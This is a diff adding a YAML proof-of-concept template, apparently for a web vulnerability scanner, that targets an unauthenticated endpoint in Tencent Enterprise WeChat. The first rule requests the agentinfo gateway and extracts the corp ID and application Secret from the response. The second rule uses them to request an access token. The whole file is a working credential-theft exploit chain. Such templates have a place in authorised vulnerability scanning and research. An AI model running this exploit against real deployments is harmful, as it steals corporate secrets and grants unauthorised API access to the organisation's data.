@@ -1,0 +1,25 @@
+name: poc-yaml-tencent-enterprise-wechat-agentinfo-unauth
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /cgi-bin/gateway/agentinfo
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains("\"strcorpid\":") && response.body_string.contains("\"agentid\":") && response.body_string.contains("\"Secret\":")
+        output:
+            search: '"\"strcorpid\":\"(?P<strcorpid>.+?)\"".submatch(response.body_string)'
+            strcorpid: search["strcorpid"]
+            search1: '"\"Secret\":\"(?P<Secret>.+?)\"".submatch(response.body_string)'
+            Secret: search1["Secret"]
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /cgi-bin/gettoken?corpid={{strcorpid}}&corpsecret={{Secret}}
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains("\"errmsg\":\"ok\"") && response.body_string.contains("\"access_token\":") && response.body_string.contains("\"expires_in\":")
+expression: r0() && r1()
+detail: {}
